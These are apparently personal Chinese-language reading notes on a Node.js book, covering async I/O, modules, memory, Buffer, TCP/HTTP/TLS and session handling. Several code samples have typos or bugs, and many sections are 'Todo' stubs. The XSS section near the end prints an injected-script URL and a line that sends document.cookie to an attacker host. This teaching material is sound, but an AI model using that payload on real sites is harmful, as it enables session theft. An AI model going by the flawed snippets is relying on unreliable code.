# 深入浅出node.js

> 该书不仅讲解了node.js方面的知识，对于了解与巩固网络传输方面的知识也有很大帮助，对前端开发来说，太棒了~

- [第一章 Node简介](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第一章-node简介)

- [第二章 Node简介](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第二章-模块机制)

- [第三章 异步I/O](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第三章-异步I/O)

- [第四章 异步编程](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第四章-异步编程)

- [第五章 内存控制](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第五章-内存控制)

- [第六章 理解Buffer](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第六章-理解Buffer)

- [第七章 网络编程](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第七章-网络编程)

- [第八章 构建Web应用](https://github.com/xblcity/reading-notes/blob/master/books/node.md#第八章-构建Web应用)

:smile: :smiley: :innocent:

## 第一章 Node简介

### 1.4 Node的特点

#### 1.4.1 异步I/O
I/O 即 Input/Output，即输入输出，异步I/O即即时Input不会立即得到Output  
比如发起ajax请求就是异步I/O
```js
$.post('/url', function() {
  console.log('收到响应')
})
console.log('发送ajax结束')
```
先输出的是`发送ajax结束`,然后输出的是`收到响应`  
也就是说，调用`$.post()`之后，后续代码是立即执行的，但是'收到响应'的执行时间是不确定的，，异步调用中对于结果值的捕获是符合'Don't call me, I will call you'的原则的，这也是注重结果，不关心过程的一种表现。

在Node中，异步I/O也很常见。以读取文件为例，我们可以看到它与前端ajax调用的方法是极其类似的。
```js
var fs = require('fs')

fs.readFile('/path', function(err, file) {
  console.log('读取文件完成')
})
console.log('发起读取文件结束')
```
同样，先输出的是'发起读取文件结束'，'读取文件完成'的执行也取决于文件的异步调用何时结束。

在Node中，我们可以从语言层面很自然的进行并行I/O操作，每个调用之间无需等待之前的I/O调用结束。
```js
fs.readFile('/path1', function(err, file) {
  console.log('读取文件1完成')
})
fs.readFile('/path2', function(err, file) {
  console.log('读取文件2完成')
})
```
对于同步I/O而言，它们的耗时是两个任务的耗时只和，而异步I/O读取文件的耗时取决于最慢的那个文件读取的耗时(异步I/O机制与实现见第三章)

#### 1.4.2 事件与回调函数

Node创建一个Web服务器，并侦听8080端口，对于服务器，我们为其绑定了request事件，对于请求对象，我们为其绑定了data事件和end事件
```js
var http = require('http')
var querystring = requre('querystring')

// 侦听服务器的request事件
http.createServer(function (req, res) {
  var postData = ''
  req.setEncoding('utf8')
  // 侦听请求的data事件
  req.on('data', function (chunk) {
    postData += chunk
  })
  // 镇定请求的end事件
  req.on('end', function() {
    res.end(postData)
  })
}).listen(8080)
console.log('服务器启动完成')
```
相应的，我们在前端为ajax绑定了success事件，在发出请求后，只关心请求成功时执行相应的业务逻辑即可
```js
$.ajax({
  'url': '/url',
  'method': 'POST',
  'data': {},
  'success': function(data) {
    // success事件要处理的内容
  }
})
```
从上面可以看出，回调函数无处不在，这是因为在js中，我们将函数作为一等公民来对待，可以将函数作为对象传递给方法作为实参进行调用

Node除了异步和事件外，回调函数也是一大特色，回调函数也是最好的接受异步调用返回数据的方式

#### 1.4.3 单线程

Node保持了js在浏览器中单线程的特点，而且在Node中，js与其他线程是无法共享任何状态的。单线程的最大好处是不用像多线程编程那样楚楚在意状态的同步问题，这里诶呦死锁的存在，也没有线程上下文交换所带来的性能上的开销。

单线程的弱点具体有以下三点  
- 无法利用多核CPU
- 错误会引起整个应用退出，应用的健壮性值得考验
- 大量计算占用CPU导致无法继续调用异步I/O

Node采用与Web Workers相同的思路来解决单线程中大计算量的问题: child_process

#### 1.4.4 跨平台

Linux与Windows

### 1.5 Node的应用场景

关于Node，讨论较多的主要有I/O密集型和CPU密集型

#### 1.5.1 I/O密集型

从单线程角度来说，Node处理I/O的能力是值得称赞的。Node面向网络且擅长并行I/O ?  

I/O密集的优势主要在于Node利用事件循环的 处理能力，而不是启动每一个线程为每一个请求服务，资源占用极少

#### 1.5.2 是否不擅长CPU密集型业务

CPU密集型应用给Node带来的挑战主要是：由于js单线程的原因，如果有长时间运行的计算(比如大循环)，将会导致CPU时间片不能释放，使得后续I/O无法发起

### 1.6 Node的使用者

- 前后端编程语言环境统一
- Node带来的高性能I/O用于实时应用
- 并行I/O使得使用者可以更高效地利用分布式环境
- 并行I/O，有效利用稳定接口提升web渲染能力
- 云计算平台提供Node支持
- 游戏开发领域
- 工具类应用

### 1.7 总结

Node的特点与优点，以及Node的使用场景

## 第二章 模块机制

js诞生之初，web1.0时代，js这种脚本语言主要有两个作用广为流传，一是表单校验，而是网页特效。web2.0时代，各种前端库和框架被开发出来，随后更多的应用需求在前端被实现，js也从表单校验跃迁到应用开发的级别上  
js不断被类剧和抽象，以更好地组织业务逻辑，从另一个角度而言，它也道出了js先天就缺乏的一项功能：模块。  
在其他高级语言中，Java有类文件，Python有import机制，Ruby有require，PHP有include和requrie，而js通过`<script>`标签引入代码的方式显得杂乱无章，语言自身毫无组织和约束能力。人们不得不用命名空间等方式人为地约束代码，以求达到安全和易用的目的

### 2.1 CommonJS规范

#### 2.1.2 CommonJS的模块规范
- 模块引用 `var math = require('math')`
- 模块定义，使用`module.exports`导出当前模块的方法或变量
- 模块标识，其实就是传递给`require()`方法的参数

### 2.2 Node的模块实现

在Node中，模块分为两类，一类是Node提供的模块，称为核心模块。另一类是用户编写的模块，称为文件模块
- 核心模块在Node源代码编译过程中，编译进了二进制执行文件，在node进程启动时，部分核心模块就直接加载进内存中，所以这部分核心引入时，文件定位和编译执行这两个步骤可以胜却迪奥，并且在路径分析中优先判断，所以它们加载速度是最快的
- 文件模块则是在运行时动态加载，需要完整的路径分析，文件定位，编译执行过程，速度比核心模块慢

#### 2.2.1 优先从缓存加载

#### 2.2.2 路径分析和文件定位

##### 1.模块标识符分析
require()方法接收一个标识符作为参数，模块标识符在Node中主要分为以下几类:  
- 核心模块，如http,fs,path等
- .或..开始的相对路径文件模块
- 以/开始的绝对路径文件模块
- 非路径形式的文件模块，如自定义的connect模块

##### 2.文件定位

require()在分析标识符的过程中，会出现标识符中不包含文件拓展名的情况，这种情况下，Node会按.js, .json, .node的次序补扩展名

#### 2.2.3 模块编译

在Node中，每个文件模块都是一个对象  
编译和执行时引入文件模块的最后一个阶段，定位到具体的文件后，Node会新建一个模块对象，然后根据路径载入并编译。对于不同的文件拓展名，器载入方法也有所不同  
- js文件，通过fs模块同步读取文件后编译执行
- .json文件，通过fs模块同步读取文件后，用JSON.parse()解析返回结果
- .node文件, 这是C/C++编写的拓展文件，通过dlopen()方法加载最后编译生成的文件
- 其余拓展名文件，它们都被当做.js文件载入

##### 1.JS模块的编译

我们知道每个模块文件中存在着require,exports,module这三个变量，但是它们在模块文件中并没有定义，那么从何而来呢？甚至在Node的Api文档中，我们知道每个模块还有__filename, __dirname这两个变量的存在，它们又是从何而来的呢？如果我们把直接定义模块的过程放在浏览器端，会存在污染全局变量的情况  

事实上，在编译的过程中，Node对获取的js文件内容进行了头尾包装
```js
(function (exports, require, modlue, __filename, __dirname) {
  var math = require('math')
  exports.area = function(radius) {
    return Math.PI * radius * radius
  }
})
```
这样每个模块文件之间都进行了作用域隔离
exports与modules.exports
// todo

##### 2.C/C++模块的编译

##### 3.JSON文件的编译

Node利用fs模块异步读取json文件的内容之后，调用JSON.parse()方法得到对象。

### 2.3 核心模块
// Todo

### 2.4 C/C++扩展模块
// 自定义模块 Todo

### 2.5 模块调用栈
C/C++内建模块属于最底层的模块，它属于核心模块，主要提供API给JS核心模块和第三方JS文件模块调用。  
JS核心模块职责有两类：作为C/C++内建模块的封装层和桥接层，供文件模块(即用户自己编写的文件)调用；一类是纯粹的功能模块，它不需要和底层打交道，但是又十分重要。

### 2.6 包与NPM
// Todo~

### 2.7 前后端共用模块
// 前端模块化AMD,CMD

### 2.8 总结
Common.js实现了Node的模块化，  
在Node中核心模块，文件模块分别是如何被加载的？  
核心模块编译以及被引入的过程与原理  
NPM的使用，以及实现自己的NPM包  
前端模块化的实现

## 第三章 异步I/O

### 3.1 为什么要异步I/O

异步获取资源，时间是获取时长最大者，同步获取资源，时间是获取资源时长之和

多线程的优缺点，优点：多线程在多核CPU能有效提高CPU利用率，缺点：锁，切换上下文

### 3.2 异步I/O现状
操作系统的非阻塞I/O的实现：轮询

### 3.3 Node的异步I/O
事件循环：// Todo
异步I/O第一部分：组装好请求对象，送入I/O线程池等待执行。第二部分：回调通知

### 3.4 非I/O的异步API
定时器的执行时机  
process.nextTick()与setImmediate()执行先后

### 3.5 事件驱动与高性能服务器
异步I/O不仅仅应用在文件操作中  
几种服务器模型的优缺点

## 第四章 异步编程

### 4.1 函数式编程

高阶函数：把函数作为参数，或是将函数作为返回值的函数，如forEach, map, reduce, reduceRight, filter, every, some

偏函数：根据不同的参数可以产生不同的返回函数

### 4.2 异步编程的优势与缺点

Node的最大特性莫过于事件驱动的非阻塞I/O模型  

Node是为了解决编程模型中阻塞I/O的性能问题的

#### 难点
- 异常处理: try catch只能处理同步异常错误
- 函数嵌套过深
- 多线程编程

### 4.3 异步编程解决方案

1.事件发布/订阅模式
```js
// 订阅
emmiter.on('event1', function() {})
// 发布
emmiter.emit('event1, 'i am message')
```
如果事件是侦听器过多，可能存在过多占用CPU的情况

2.Promise
3.async

### 4.4 异步并发控制

### 4.5 总结

本章主要介绍了异步编程的几种解决方案，如事件发布/订阅，Promsie等

## 第五章 内存控制

### 5.1 V8的垃圾回收机制和内存限制

新生代内存与老生代内存

### 5.2 高效使用内存

#### 5.2.1 作用域
```js
var foo = function() {
  var local = {}
}
```
函数在被调用时会创建对应的作用域，函数执行完毕后，该作用域会被销毁。同时函数作用域内的局部变量分配在该作用域上，随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短，在这个示例中，由于对象非常小，将会分配在新生代的From空间中，在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。  
以上就是基本的内存回收过程

### 5.2.2 闭包

作用域链上的对象只能向上，这样外部无法向内部访问。如
```js
var foo = function() {
  var local = '局部变量'
  (function() {
    console.log(local)
  }())
}

var bar = funciton() {
  (function() {
    var local = '局部变量'
  }())
  console.log(local)
}
```
在js中，实现外部作用域访问内部作用域中变量的方法叫做闭包(closure)，这得益于高阶函数这个特性：函数可以作为参数或者返回值，示例代码如下：
```js
var foo = function() {
  var bar = function() {
    var local = '局部变量'
    return function() {
      return local
    }
  }
  var baz = bar() // bar函数引用了local变量，使得bar的作用于一直存在
  console.log(baz()) // local
}
```
// Todo

### 5.3 内存指标

查看进程的内存占用：process.memoryUsage()  
查看系统的内存占用：os.totalmem()以及freemem()  
Node的内存使用并非都是通过V8进行分配的，我们将那些不是通过V8分配的内存称为堆外内存。  
Buffer对象不同于其他对象，它不经过V8的内存分配机制，所以也不会有堆内存的大小限制。

### 5.4 内存泄漏

造成内存泄漏的原因如下：缓存，队列消费不及时，作用域未释放

#### 5.4.1 慎将内存当做缓存

严格意义上缓存有着完善的过期策略，，而普通对象的键值对并没有  
一个可能造成内存泄漏的场景，memoize，undescore的实现：
```js
_.memorize = function(func, hasher) {
  var memo = {}
  hasher || (hasher = _.identity)
  return function() {
    var key = hasher.apply(this,arguments)
    return _.has(memo, key) ? memo[key] : (memo[key] = func.apply(this,arguments))
  }
}
```
这里潜藏的陷阱是每个被执行的结果都会按照参数缓存在memo对象上，不会被清除，这在前端网页这种短时应用场景中不存在大问题，但是执行量大和参数多样性的情况下，会造成内存占用不释放。  
所以在Node中，任何视图拿内存当缓存的行为都应当被限制。

### 5.5 内存泄漏排查
使用工具定位Node应用的内存泄漏

### 5.6 大内存应用
Node提供了stream模块用于处理大文件，stream分为可读，可写两种   
Node大多数模块都有stream的应用，比如fs的createReadStream()和createWriteStream()可以分别用于创建文件的可读流和可写流

**buffer和stream的关系**  
buffer  
为数据缓冲对象，是一个类似数组结构的对象，可以通过指定开始写入的位置及写入的数据长度，往其中写入二进制数据
stream  
是对buffer对象的高级封装，其操作的底层还是buffer对象，stream可以设置为可读、可写，或者即可读也可写，在nodejs中继承了EventEmitter接口，可以监听读入、写入的过程。具体实现有文件流，httpresponse等

### 5.7 总结
Node将js的主要应用场景扩散到了服务器端，需要考虑的细节也与浏览器不同，需要更严谨地为每一份资源作出安排

## 第六章 理解Buffer

文件和网络I/O对于前端开发者而言都是不曾有的应用场景。  
由于应用场景不同，在Node中，应用需要处理网络协议，操作数据库，处理图片，接收上传文件等，在网络流和文件的操作中，还要处理大量二进制数据,js自带的字符串远远不能满足这些需求（JavaScript语言没有读取或操作二进制数据流的机制。），于是Buffer对象应运而生。

### 6.1 Buffer结构
Buffer是一个像Array的对象，元素为16进制的两位数，即0-255的数值

由于buffer太过常见，Node在进程开启时就已经加载了它，并将其放在全局对象(global)上，所以在使用buffer时，无需通过require()即可直接使用

#### 6.1.3 beffer内存分配
buffer对象内存匹配不是在V8的堆内存中，而是在Node的C++层面实现内存的申请的，Node在内存中使用的是C++层面申请内存，在js层面分配内存的策略

Node以8KB为界限来区分Buffer是大对象还是小对象

### 6.2 Buffer的转换
字符串转buffer， `new Buffer(str, [encoding])` 第二个参数是编码模式，一般是UTF-8  
buffer转字符串，`buf.toString([encoding], [start], [end])`

### 6.3 Buffer的拼接

### 6.4 Buffer与性能

### 6.5 总结
Buffer是二进制数据，字符串与Buffer之间存在编码关系

## 第七章 网络编程
### 7.1 构建TCP服务
目前大多数应用都是基于TCP搭建而成的
#### 7.1.1 TCP
TCP,Transmission Control Prototal,传输控制协议，在OSI模型中属于传输层协议。  
OSI模型由七层组成：物理层，数据链结层，网络层，传输层，会话层，表示层，应用层    

| 应用层 | 表示层 | 会话层 | 传输层 | 网络层 | 链路层 | 物理层 |  
| -----  | ----- | ----- | ----- | ----- | ----- | ----- |
| HTTP/SMTP/IMAP等 | 加密/解密等 | 通信连接/维持会话 | TCP/UDP | IP | 网络特有的链路接口 | 网络物理硬件 |

#### 7.1.2 创建TCP服务器端
服务器端即接收请求的一端
```js
var net = require('net')
var server = net.createServer(function(socket) {
  socket.on('data', function(data) {
    socket.write('你好')
  })

  socket.on('end', function() {
    console.log('连接断开')
  })

  socket.write('欢迎光临~')
})
server.listen(8000, function() {
  console.log('server bound')
})
```
出错，Unhandled 'error' event
#### 7.1.3 TCP服务的事件
##### 1.服务器事件
通过net.createServer()创建的服务器而言，它是一个EventEmitter实例，有如下自定义事件  

**listening**: 该事件在调用server.listen()绑定端口或者Domain Socket后出发，简洁写法为server.listen(port, listeningListener)，通过listen()方法的第二个参数传入。  
**connection**:该事件在每个**客户端**连接到服务器端时触发，简洁写法为通过net.createServer()，最后一个参数传递  
**close**: 该事件在服务器关闭时触发，在调用server.close()后，服务器将停止接收新的套接字连接，但保护当前存在的连接，等待所有连接都断开后，会触发该事件。  
**error**: 该事件在服务器发生异常时，将会触发该事件，比如侦听一个使用中的端口，将会触发一个异常，如果不侦听error事件，服务器将会抛出异常。

##### 2.连接事件(本例可以理解为socket上的事件)
服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可读可写**Stream对象**。**Stream对象**可以用于服务器端和客户端之间的通信，既可以通过data事件从一段读取另一端发来的数据，也可以通过write()方法从一端向另一端发送数据。它有如下自定义事件。  

**data**: 当一端调用write()发送数据时，另一端会触发data事件，事件传递的数据即是write()发送的数据  
**end**: 当连接中的任意一端发送了FIN数据时，将会触发该事件。  
**connect**: 该事件用于客户端，当套接字与服务器连接成功时会被触发  
**drain**: 当任意一端调用write()发送数据时，当前这端会触发该事件  
**error**: 当异常发生时，会触发该事件。  
**close**: 放套接字完全关闭时，触发该事件。  
**timeout**：当一定事件后连接不再活跃时，该事件将会被触发，通知用户当前该连接已经被闲置了。

另外，由于TCP套接字是可读可写的Stream对象，可以利用pipe()方法巧妙地实现管道操作，如下代码实现了一个echo服务器：  
```js
var net = require('net')
var server = net.createServer(function(socket) {
  socket.write('Echo server')
  socket.pipe(socket)
})
server.listen(1337, '127.0.0.1')
```

### 7.2 构建UDP服务
// Todo

### 7.3 构建HTTP服务
TCP和UDP都属于网络传输层协议，如果要构建高效地网络应用，就应该从传输层着手。但是对于经典的应用场景，则无需从传输层协议入手构造自己的应用，比如HTTP或SMTP等，这些经典的应用层协议对于普通应用而言绰绰有余。Node提供了基本的http和https模块用于HTTP和HTTPS的封装，对于其他应用层协议的封装，也能从社区中轻松找到其实现。  
实现一个HTTP服务器极其容易，代码如下：
```js
var http = require('http')
http.createServer(function(req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'})
  res.end('Hello World')
}).listen(1337, function() {
  console.log('server start')
})
```
#### 7.3.1 HTTP
HyperText Transfer Protocol，超文本传输协议,HTTP构建在TCP之上，属于应用层协议，在HTTP的两端是服务器和浏览器，即著名的B/S模式，如今精彩纷呈的Web即是HTTP的应用。(app也是HTTP应用)

现在的应用，如浏览器，其实是一个**HTTP的代理**，用户的行为将会通过它转换为HTTP请求报文发送给服务器端，服务器端在处理请求后，发送响应报文给代理，代理在解析报文后，将用户需要的内容呈现在界面上。

在linux命令行，可以使用 curl发送请求  
// HTTP报文，todo
#### 7.3.2 http模块
在Node中,HTTP服务继承自TCP服务(net模块),它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用，所以能实现高并发。HTTP服务于TCP服务模型由区别的地方在于，在开启keep-alive后，一个TCP会话可以用于多次请求和相应，TCP服务以connection为单位进行u、服务，HTTP服务以request为单位进行服务，http模块即使将connection到request的过程进行了封装。  
在请求产生的过程中，http模块那大连接中传来的数据，调用二进制模块http_parser进行解析，**在解析完请求报文的报头后，触发request事件，调用用户的业务逻辑**

**HTTP请求**  
req.method: 请求方法，值为GET，POST,DELETE,PUT.CONNECT等  
req.url：/等  
req.httpVersion: 1.1等  
其余报头会议上股个别规律的key:value格式，在解析后方盒子在req.headers属性上传递给业务逻辑以供调用

**HTTP响应**  
响应头部信息的API：req.setHead,(这个貌似没找到用处?) req.setHeader  

如同TCP服务一样，http服务器也抽象了一些时间，以供应用层使用，服务器也是一个EventEmitter实例。  
connection事件：在开始http请求和响应前，客户端与服务器端需要建立底层的TCP连接，这个连接可能因为开启了keep-alive，可以在多次请求响应之间使用，当这个连接建立时，服务器触发一次connection事件。  
request事件：建立TCP连接后，http模块底层将在数据流中抽象出HTTP请求和HTTP响应，当强求数据发送到服务器端，在解析出HTTP请求头后，将会触发该事件，在res.end()后，TCP连接可能将用于下一次请求响应。  
close事件：与TCP服务器的行为一致。  
checkContinue事件： 。。。  
connect事件：  
upgrade事件：  
clientError事件

#### 7.3.3 HTTP客户端
即用于**发送请求**的一段，node模块提供的api为: http.request(options,connect),用于构造http客户端，与curl命令大致相同
```js
var options = {
  hostname: '127.0.0.1',
  port: 1334,
  path: '/',
  method: 'GET'
}

var req = http.request(options, function(res) {
  console.log('STATUS', res.statusCode)
  console.log('HEADERS', JSON.stringify(res.headers))
  res.setEncoding('utf8')
  res.on('data', function(chunk) {
    console.log(chunk)
  })
}

req.end()
```

### 7.4 构建WebSocket服务
相比HTTP，WebSocket更接近于传输层协议，它并没有在HTTP的基础上模拟服务器端的发送，而是在TCP上定义独立的协议，让人迷路的部分在于WebSocket的握手部分是由HTTP完成的，使人可能觉得它可能是基于HTTP实现的。
#### 7.4.1 WebSocket握手
请求报文
```js
GET /chat HTTP/1.1
Host: xxx.com
// 请求服务升级协议为WebSocket
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHn...  // 安全校验
Sec-WebSocket-Prototal: chat, superchat  // 子协议
Sec-Websocket-Version: 13  // 版本号
```
响应报文
```js
HTTP/1.1 101 Switching Protocols
// 更新应用层协议为WebSocket协议
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPl...
Sec-WebSocket-Prototal: chat
```
node代码部分 // Todo
#### 7.4.2 WebSocket数据传输
在握手顺利完成后，当前连接不再进行HTTP的交互，而是开始WebSocket的数据帧协议，实现客户端与服务器端的数据交换，握手完成后，客户端的onopen()将会被触发执行，代码如下：
```js
socket.onopen = function() {
  // 要做的事情
}
```
服务器端。 // Todo

### 7.5 网络服务与安全

为防止数据被监听，我们需要将数据加密后再进行网络传输，但是对于应用层而言，如HTTP，FTP等，我们仍希望能够透明的处理数据，而无需操心网络传输过程中的安全问题。  
SSL Secure Sockets Layer，安全嵌套层，SSL作为一种安全协议，它在传输层提供对网络连接加密的功能。对于应用层而言，它是透明的，数据在传递到应用层之前就已经完成了加密和解密的过程。最初的SSL应用在Web上，被放服务器端和浏览器端同时支持，对吼IEIF将其标准化，成为TLS(Transport Layer Security, 安全传输层协议)   
Node在网络安全上提供了3个模块，分别为crypto, tls, https.其中crypto主要用于加密解密，SHAI,MD5等加密算法都在其中有体现，真正用于网络的是另外两个模块，tls模块提供了与net模块类似的功能，区别在于它建立在TLS/SSL加密的TCP连接上，对于https而言，它完全与http模块接口一致，区别也仅在于它建立安全的连接之上。

#### 7.5.1 TLS/SSL
1. 秘钥
TLS/SSL是一种公钥/私钥的结构，它是一个非对称结构，每个服务器端和客户端都有自己的公私钥，公钥用来加密要传输的数据，私钥用来解密接收收到的数据
// Todo
2. 数字证书
// Todo Todo

#### 7.5.2 TLS服务
利用tls模块，在创建server的时候需要传入一个options的对象参数，其中包含CA证书

#### 7.5.3 HTTPS服务
HTTPS服务就是工作在TLS/SSL上的HTTP  
创建HTTPS服务
```js
var https = require('https')
var fs = require('fs')
var options = {
  key: fs.readFileSync('./keys/server.key'),
  cert: fs.readFileSync('./keys/server.crt')
}

http.createServer(options, function(req, res) {
  res.writeHead(200)
  res.end('hello world')
}).listen(8000)
```
HTTPS客户端，也需要指定证书的相关参数 // Todo

### 7.6 总结
Node基于事件驱动和非阻塞设计，在分布式环境中尤其能发挥出它的特长，基于事件驱动可以实现与大量的客户端进行对接，非阻塞设计则可以让它更好的提升网络的响应吞吐，Node提供了相对底层的网络调用，以及基于事件的编程接口，使得开发者在这些模块上十分轻松的构建网络应用

## 第八章 构建Web应用

### 8.1 基础功能

本章Web应用方面的内容，将从http模块中的服务器端的request事件开始分析。request事件发生于网络连接建立，客户端向服务端发送报文，服务端解析报文，发现HTTP请求的报头时，在已触发request事件前，它已准备好ServerRequest和ServerResponse对象以供对请求和响应报文的操作，比如，官方的一个简单示例，就是调用ServerResponse实现响应的。

```js
var http = require('http')
http.createServer(function() {
  res.writeHead(200, {'Content-Type': 'text/plain'})
  res.end('Hello World')
}).listen(1337, '127.0.0.1', function() {
  console.log('服务启动啦~')
})
```
对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求，在具体的业务中，我们可能会有如下这些需求。

- 请求方法的判断
- URL的路径解析
- URL中查询字符串解析
- Cookie的解析
- 认证
- 表单数据的解析
- 任意格式文件的上传处理

#### 8.1.1 请求方法
除了最常见的GET, POST之外，还有HEAD, DELETE, PUT, CONNECT等方法。通常，我们只需要处理GET, POST两类请求方法，但是在Restful类web服务中心请求方法十分重要，因为它会决定资源的操作行为。PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELETE表示删除一个资源。我们可以通过请求方法来决定响应行为，如

```js
function (req, res) {
  switch(req.method) {
    case 'POST':
      update(req, res)
      break
    case 'DELETE':
      remove(req, res)
      break
    case 'PUT':
      create(req, res)
      break
    case 'GET':
    default:
      get(req, res)
  }
}
```

#### 8.1.2 路径解析
HTTP_Parser将其解析为req.url, hash部分会被丢掉  
一种比较常见的是根据路径进行业务处理的应用是静态文件服务器，还有一种是根据路径来选择控制器

#### 8.1.3 查询字符串
在地址栏路径后的`?foo=bar&baz=val`可以使用node核心模块querystring，`querystring.parse(req.url.split(?)[1])`, 当然更简洁的方法是使用引入核心模块url,`url.parse(req.url,true).query`

#### 8.1.4 Cookie
HTTP是无状态的，现实中的应用却需要一定的状态，如何标识和认证一个用户，最早的方案就是Cookie了

Cookie的处理分为如下几步：  
- 服务端向客户端发送Cookie
- 浏览器将Cookie保存
- 之后每次浏览器都会将Cookie发送服务器端

命令行模拟发送cookie `curl -v -H "Cookie: foo=bar; baz=val" "http://127.0.0.1:1337/path?foo=bar&baz=val"`

获取cookie`req.headers.cookie`，cookie是字符串如`Cookie: foo=bar; baz=val`的方式，可以写一个函数进行解析，如下

```js
var parseCookie = function(cookie) {
  var cookies = {}
  if(!cookie) {
    return cookies
  }
  var list = cookie.split(';')
  for (var i=0; i <list.length; i++) {
    var pair = list[i].split('=')
    cookies[pair[0].trim()] = pair[1]
  }
  return cookies
}
```
响应字段在Set-Cookie里面，例如`Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=domian.com`,主要选项

- path，表示cookie影响到的路径
- Expires和Max-Age告知浏览器何时过期
- HttpOnly，告知浏览器不可以通过脚本`document.cookie`去更改cookie值
- Secure: 当设置为true只有在HTTPS中才有效

Cookie的性能问题：cookie在发送每次请求都会被带到服务端，优化：   
- 减小cookie大小
- 为静态资源使用不同的域名
- 减少DNS查询？

#### 8.1.5 Session
通过Cookie，浏览器和服务器可以实现状态的记录，但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了，综上所述，Cookie对于敏感数据的保护是无效的。

为了解决Cookie敏感数据的问题，Session应运而生。Session的数据值保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。

虽然在服务端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。

1. 基于Cookie来实现用户和数据的映射
将口令放在Cookie里面，口令如何产生？一般服务器端会约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重读的值，并设置超时时间。以下为生成session的代码：
```js
var sessions = {}
var key = 'session_id'
var EXPIRES = 20*60*1000

var generate = function() {
  var session = {}
  session.id = (new Date()).getTime() + Math.random()
  session.cookie = {
    expire: (new Date()).getTime() + EXPIRES
  }
  sessions[session.id] = session
  return session
}
```

每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下：

```js
function (req, res) {
  var id = req.cookies[key];
  if (!id) {
    req.session = generate()
  } else {
    var session = sessions[id]
    if (session) {
      if (session.cookie.expire > Date.now()) {
        // 更新超时时间
        session.cookie.expire = Date.now() + EXPIRES
        req.session = session
      } else {
        // 超时了，删除旧的数据，并重新生成
        delete sessions[id]
        req.session = generate()
      }
    } else {
      // 如果session过期或者口令不对，重新生成Session
      req.session = generate()
    }
  }
  handle(req, res)
}
```

当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据，这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，如下：

```js
var writeHead = res.writeHead
res.writeHead = function() {
  var cookies = req.getHeader('Set-Cookie')
  var session = serialize(key, req.session.id)
  cookie = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]
  res.setHeader('Set-Header', cookies)
  return writeHead.apply(this, arguments)
}
```

至此，session在前后端进行对应的过程就完成了，这样的业务路基可以判断和设置session，以此来维护用户和服务器端的关系，如下所示：

```js
var handle = function(req, res) {
  if(!req.session.isVisit) {
    res.session.isVisit = true
    res.writeHead(200)
    res.end('欢迎第一次来到动物园')
  } else {
    res.writeHead(200)
    res.end('动物园再次欢迎你！')
  }
}
```

2. 第二种：通过查询字符串来实现浏览器端和服务器端数据的对应

在上面的示例代码中，我们都将Session数据直接存在了变量sessions中，它位于内存中，然而在第五章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会因此垃圾回收的频繁扫描，引起性能问题。  
另一个问题则是我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会有引起错乱。  

为了解决性能问题和Session数据无法跨进程共享的问题，常见的方案是将session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中，目前常用的工具是Redis、Memcached等。通过这些高效地缓存，Node进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理高效，比在Node中自行设计缓存策略更好。

尽管采用专门的缓存服务回避直接在内存中访问慢，但其影响小之又小，带来的好处远远大于直接在Node中存储数据。

Session安全：通过私钥加密进行签名

##### 安全问题
XSS漏洞  
全称Cross-Site Scripting 跨站脚本攻击。XSS漏洞会让本地脚本执行，它的形成原因多数是用户的输入没有被转义，而被直接执行，比如某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示
```js
$('#box').html(location.hash.replace('#', ''))
```
攻击者在发现这里的漏洞之后，构造成了这样的URL
```js
http://a.com/pathname#<script src="http://b.com/c.js"></script>
```
为了不让受害者发现这端URL中的猫腻，它可能会通过URL压缩成一个短网址，如下
```js
http://t.cn/fasdfj
// 或者再次压缩
http://url.cn/fasdfb
```
然后将最终的短网址发给某个登录的在线用户，这样一来。这端hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下：
```js
location.href = 'http://c.com/?' + document.cookie
```
这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令，然后他在客户端那种用这个口令伪造Cookie，从而实现了伪装用户的身份，如果该用户是网站管理员，就可能造成极大的危害

#### 8.1.6 缓存
